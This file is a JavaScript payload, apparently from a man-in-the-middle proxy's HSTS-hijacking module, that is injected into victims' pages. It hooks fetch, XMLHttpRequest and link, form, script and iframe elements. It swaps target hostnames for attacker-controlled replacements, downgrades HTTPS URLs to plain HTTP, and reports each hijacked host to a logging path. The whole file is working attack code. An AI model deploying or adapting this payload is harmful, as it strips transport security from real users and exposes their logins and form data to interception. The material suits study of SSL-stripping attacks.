/*
  Hooks XMLHttpRequest.open and fetch, as well as 'a', 'form', 'script' and 'iframe' nodes.
  This payload is essential for hostname replacements.

  Remember that any occurrence of 'obf_hstshijack_path_ssl_log', 'obf_hstshijack_path_callback' and
  'obf_hstshijack_path_whitelist' in this payload will be replaced when the proxy module
  loads and that variable names 'obf_hstshijack_var_target_hosts' and 'obf_hstshijack_var_replacement_hosts'
  are already declared before this is injected.
*/

(function(){
  "use strict";

  var obf_hstshijack_var_regex_one = /\-/g,
    obf_hstshijack_var_regex_two = /^\*./,
    obf_hstshijack_var_regex_three = /^\*\./,
    obf_hstshijack_var_regex_four = /\./g,
    obf_hstshijack_var_regex_five = /^\*\./,
    obf_hstshijack_var_regex_six = /\.\*$/,
    obf_hstshijack_var_regex_seven = /\.\*/g,
    obf_hstshijack_var_regex_eight = /^((?:[a-z0-9.+-]{1,256}[:])(?:[/][/])?|(?:[a-z0-9.+-]{1,256}[:])?[/][/])?.*$/i,
    obf_hstshijack_var_regex_nine = /^((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.){1,63}(?:[a-z]{1,63})|(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9])\.(?:25[0-5]|2[0-4][0-9]|[1][0-9][0-9]|[1-9]?[0-9]))?.*$/i,
    obf_hstshijack_var_regex_ten = /^([:](?:6553[0-5]|655[0-2][0-9]|65[0-4][0-9][0-9]|6[0-4][0-9][0-9][0-9]|[0-5][0-9][0-9][0-9][0-9]|[1-9][0-9]{0,3}))?.*$/i,
    obf_hstshijack_var_regex_eleven = /^([^?#]{1,2048})?.*$/i,
    obf_hstshijack_var_regex_twelve = /^([?][^#]{0,2048})?.*$/i,
    obf_hstshijack_var_regex_thirteen = /^\s*(.*)\s*$/g;

  var obf_hstshijack_func_open = XMLHttpRequest.prototype.open,
      obf_hstshijack_var_XMLHttpRequest = new XMLHttpRequest(),
      obf_hstshijack_func_fetch = globalThis.fetch,
      obf_hstshijack_var_callback_log = [];

  function obf_hstshijack_func_trimLeadingAndTrailingWhitespaces(obf_hstshijack_var_str) {
    return obf_hstshijack_var_str.replace(obf_hstshijack_var_regex_thirteen, "$1");
  }

  function obf_hstshijack_func_toWholeRegexpSet(obf_hstshijack_var_selector_string, obf_hstshijack_var_replacement_string) {
    if (obf_hstshijack_var_selector_string.indexOf("*") != -1) {
      obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(obf_hstshijack_var_regex_one, "\\-");
      if (obf_hstshijack_var_selector_string.match(obf_hstshijack_var_regex_two)) {
        var obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(obf_hstshijack_var_regex_three, "((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?.)+)"),
            obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(obf_hstshijack_var_regex_four, "\\."),
            obf_hstshijack_var_replacement_string = obf_hstshijack_var_replacement_string.replace(obf_hstshijack_var_regex_five, "");
        return [
          new RegExp("^" + obf_hstshijack_var_selector_string + "$", "ig"),
          "$1" + obf_hstshijack_var_replacement_string
        ];
      } else if (obf_hstshijack_var_selector_string.match(obf_hstshijack_var_regex_six)) {
        var obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(obf_hstshijack_var_regex_seven, "((?:.[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?)+)"),
            obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(obf_hstshijack_var_regex_four, "\\."),
            obf_hstshijack_var_replacement_string = obf_hstshijack_var_replacement_string.replace(obf_hstshijack_var_regex_six, "");
        return [
          new RegExp(obf_hstshijack_var_selector_string, "ig"),
          obf_hstshijack_var_replacement_string + "$1"
        ];
      }
    } else {
      var obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(obf_hstshijack_var_regex_four, "\\."),
          obf_hstshijack_var_selector_string = obf_hstshijack_var_selector_string.replace(/\-/g, "\\-");
      return [
        new RegExp("^" + obf_hstshijack_var_selector_string + "$", "ig"),
        obf_hstshijack_var_replacement_string
      ];
    }
  }

  function obf_hstshijack_func_parseURL(obf_hstshijack_var_url) {
    var obf_hstshijack_var_sliceLength = 0;
    var obf_hstshijack_var_strippedURL = obf_hstshijack_func_trimLeadingAndTrailingWhitespaces(obf_hstshijack_var_url);
    var obf_hstshijack_var_retval = ["","","","","",""];
    /* obf_hstshijack_protocol */
    obf_hstshijack_var_retval[0] = obf_hstshijack_var_strippedURL.replace(obf_hstshijack_var_regex_eight, "$1");
    var obf_hstshijack_var_protocol = obf_hstshijack_var_retval[0].toLowerCase();
    if (obf_hstshijack_var_protocol.length !== 0) {
      if (
        obf_hstshijack_var_protocol === "about:"
        || obf_hstshijack_var_protocol === "data:"
        || obf_hstshijack_var_protocol === "file:"
        || obf_hstshijack_var_protocol === "geo:"
        || obf_hstshijack_var_protocol === "javascript:"
        || obf_hstshijack_var_protocol === "tel:"
      ) {
        obf_hstshijack_var_retval[3] = obf_hstshijack_var_strippedURL.slice(obf_hstshijack_var_retval[0].length);
        return obf_hstshijack_var_retval;
      }
      /* obf_hstshijack_host */
      obf_hstshijack_var_retval[1] = obf_hstshijack_var_strippedURL.slice(obf_hstshijack_var_retval[0].length).replace(obf_hstshijack_var_regex_nine, "$1");
    }
    /* obf_hstshijack_port */
    obf_hstshijack_var_sliceLength = obf_hstshijack_var_retval[0].length + obf_hstshijack_var_retval[1].length;
    obf_hstshijack_var_retval[2] = obf_hstshijack_var_strippedURL.slice(obf_hstshijack_var_sliceLength).replace(obf_hstshijack_var_regex_ten, "$1");
    /* obf_hstshijack_path */
    obf_hstshijack_var_sliceLength = obf_hstshijack_var_sliceLength + obf_hstshijack_var_retval[2].length;
    obf_hstshijack_var_retval[3] = obf_hstshijack_var_strippedURL.slice(obf_hstshijack_var_sliceLength).replace(obf_hstshijack_var_regex_eleven, "$1");
    /* obf_hstshijack_search */
    obf_hstshijack_var_sliceLength = obf_hstshijack_var_sliceLength + obf_hstshijack_var_retval[3].length;
    obf_hstshijack_var_retval[4] = obf_hstshijack_var_strippedURL.slice(obf_hstshijack_var_sliceLength).replace(obf_hstshijack_var_regex_twelve, "$1");
    /* obf_hstshijack_hash */
    obf_hstshijack_var_retval[5] = obf_hstshijack_var_strippedURL.slice(obf_hstshijack_var_sliceLength + obf_hstshijack_var_retval[4].length);
    return obf_hstshijack_var_retval;
  }

  function obf_hstshijack_func_callback(obf_hstshijack_var_host) {
    for (
      var obf_hstshijack_var_i = 0;
      obf_hstshijack_var_i < obf_hstshijack_var_callback_log.length;
      obf_hstshijack_var_i++
    ) {
      if (obf_hstshijack_var_callback_log[i] == obf_hstshijack_var_host) {
        return;
      }
    }
    obf_hstshijack_var_callback_log.push(obf_hstshijack_var_host);
    obf_hstshijack_func_fetch(location.origin + "/obf_hstshijack_path_ssl_log?" + obf_hstshijack_var_host)
  }

  function obf_hstshijack_func_hijack(obf_hstshijack_var_host) {
    for (
      var obf_hstshijack_var_i = 0;
      obf_hstshijack_var_i < obf_hstshijack_var_target_hosts.length;
      obf_hstshijack_var_i++
    ) {
      var obf_hstshijack_var_whole_regexp_set = obf_hstshijack_func_toWholeRegexpSet(
        obf_hstshijack_var_target_hosts[obf_hstshijack_var_i],
        obf_hstshijack_var_replacement_hosts[obf_hstshijack_var_i]);
      if (obf_hstshijack_var_host.match(obf_hstshijack_var_whole_regexp_set[0])) {
        obf_hstshijack_var_host = obf_hstshijack_var_host.replace(
          obf_hstshijack_var_whole_regexp_set[0],
          obf_hstshijack_var_whole_regexp_set[1]);
        break;
      }
    }
    return obf_hstshijack_var_host;
  }

  function obf_hstshijack_func_hook_XMLHttpRequest() {
    XMLHttpRequest.prototype.open = function(
      obf_hstshijack_var_method,
      obf_hstshijack_var_url,
      obf_hstshijack_var_async,
      obf_hstshijack_var_username,
      obf_hstshijack_var_password
    ) {
      var obf_hstshijack_var_parsed_url = obf_hstshijack_func_parseURL(obf_hstshijack_var_url),
          obf_hstshijack_var_hijacked_host = obf_hstshijack_func_hijack(obf_hstshijack_var_parsed_url[1]);
      if (obf_hstshijack_var_hijacked_host != obf_hstshijack_var_parsed_url[1]) {
        if (obf_hstshijack_var_parsed_url[0].toLowerCase() === "https://") {
          obf_hstshijack_var_parsed_url[0] = obf_hstshijack_var_parsed_url[0].replace(/(http)s:\/\//i, "$1://");
        }
        if (obf_hstshijack_var_parsed_url[2] === ":443") {
          obf_hstshijack_var_parsed_url[2] = "";
        }
      }
      obf_hstshijack_var_url = obf_hstshijack_var_parsed_url[0] +
        obf_hstshijack_var_hijacked_host +
        obf_hstshijack_var_parsed_url[2] +
        obf_hstshijack_var_parsed_url[3] +
        obf_hstshijack_var_parsed_url[4] +
        obf_hstshijack_var_parsed_url[5];
      return obf_hstshijack_func_open.apply(this, arguments);
    }
  }

  function obf_hstshijack_func_hook_fetch() {
    globalThis.fetch = function(obf_hstshijack_var_resource, obf_hstshijack_var_options) {
      var obf_hstshijack_var_parsed_url = obf_hstshijack_func_parseURL(obf_hstshijack_var_resource),
          obf_hstshijack_var_hijacked_host = obf_hstshijack_func_hijack(obf_hstshijack_var_parsed_url[1]);
      if (obf_hstshijack_var_hijacked_host != obf_hstshijack_var_parsed_url[1]) {
        if (obf_hstshijack_var_parsed_url[0].toLowerCase() === "https://") {
          obf_hstshijack_var_parsed_url[0] = obf_hstshijack_var_parsed_url[0].replace(/(http)s:\/\//i, "$1://");
        }
        if (obf_hstshijack_var_parsed_url[2] === ":443") {
          obf_hstshijack_var_parsed_url[2] = "";
        }
      }
      obf_hstshijack_var_resource = obf_hstshijack_var_parsed_url[0] +
        obf_hstshijack_var_hijacked_host +
        obf_hstshijack_var_parsed_url[2] +
        obf_hstshijack_var_parsed_url[3] +
        obf_hstshijack_var_parsed_url[4] +
        obf_hstshijack_var_parsed_url[5];
      return obf_hstshijack_func_fetch(obf_hstshijack_var_resource, obf_hstshijack_var_options);
    }
  }

  function obf_hstshijack_func_hook_nodes() {
    document.querySelectorAll("a,form,script,iframe").forEach(function(obf_hstshijack_var_node){
      try {
        var obf_hstshijack_var_url = "";
        switch (obf_hstshijack_var_node.tagName) {
          case "A":
            obf_hstshijack_var_node.href
              ? obf_hstshijack_var_url = obf_hstshijack_var_node.href
              : "";
            break;
          case "FORM":
            obf_hstshijack_var_node.action
              ? obf_hstshijack_var_url = obf_hstshijack_var_node.action
              : "";
            break;
          case "SCRIPT":
            obf_hstshijack_var_node.src
              ? obf_hstshijack_var_url = obf_hstshijack_var_node.src
              : "";
            break;
          case "IFRAME":
            obf_hstshijack_var_node.src
              ? obf_hstshijack_var_url = obf_hstshijack_var_node.src
              : "";
            break;
        }
        if (obf_hstshijack_var_url.match(/^\s*(?:http[s]?:)?\/\/[^:/?#]+/i)) {
          var obf_hstshijack_var_parsed_url = obf_hstshijack_func_parseURL(obf_hstshijack_var_url),
              obf_hstshijack_var_hijacked_host = obf_hstshijack_func_hijack(obf_hstshijack_var_parsed_url[1]);
          if (obf_hstshijack_var_hijacked_host != obf_hstshijack_var_parsed_url[1]) {
            if (obf_hstshijack_var_parsed_url[0].toLowerCase() === "https://") {
              obf_hstshijack_var_parsed_url[0] = obf_hstshijack_var_parsed_url[0].replace(/(http)s:\/\//i, "$1://");
            }
            if (obf_hstshijack_var_parsed_url[2] === ":443") {
              obf_hstshijack_var_parsed_url[2] = "";
            }
          }
          var obf_hstshijack_var_hijacked_url = obf_hstshijack_var_parsed_url[0] +
            obf_hstshijack_var_hijacked_host +
            obf_hstshijack_var_parsed_url[2] +
            obf_hstshijack_var_parsed_url[3] +
            obf_hstshijack_var_parsed_url[4] +
            obf_hstshijack_var_parsed_url[5];
          switch (obf_hstshijack_var_node.tagName) {
            case "A":
              if (obf_hstshijack_var_node.href) {
                obf_hstshijack_var_node.href = obf_hstshijack_var_hijacked_url;
              }
              break;
            case "FORM":
              if (obf_hstshijack_var_node.action) {
                obf_hstshijack_var_node.action = obf_hstshijack_var_hijacked_url;
              }
              break;
            case "SCRIPT":
              if (obf_hstshijack_var_node.src) {
                obf_hstshijack_var_node.src = obf_hstshijack_var_hijacked_url;
              }
              break;
            case "IFRAME":
              if (obf_hstshijack_var_node.src) {
                obf_hstshijack_var_node.src = obf_hstshijack_var_hijacked_url;
              }
              break;
          }
          obf_hstshijack_func_callback(obf_hstshijack_var_parsed_url[1].toLowerCase());
        }
      } catch(obf_hstshijack_var_ignore) {}
    });
  }

  try {
    obf_hstshijack_func_hook_XMLHttpRequest();
  } catch(obf_hstshijack_var_ignore) {}

  try {
    obf_hstshijack_func_hook_fetch();
  } catch(obf_hstshijack_var_ignore) {}

  globalThis.addEventListener("DOMContentLoaded", function(){
    try {
      setInterval(obf_hstshijack_func_hook_nodes, 2000);
      obf_hstshijack_func_hook_nodes();
    } catch(obf_hstshijack_var_ignore) {}

    try {
      globalThis.addEventListener("load", obf_hstshijack_func_hook_nodes);
    } catch(obf_hstshijack_var_ignore) {}
  });
})();

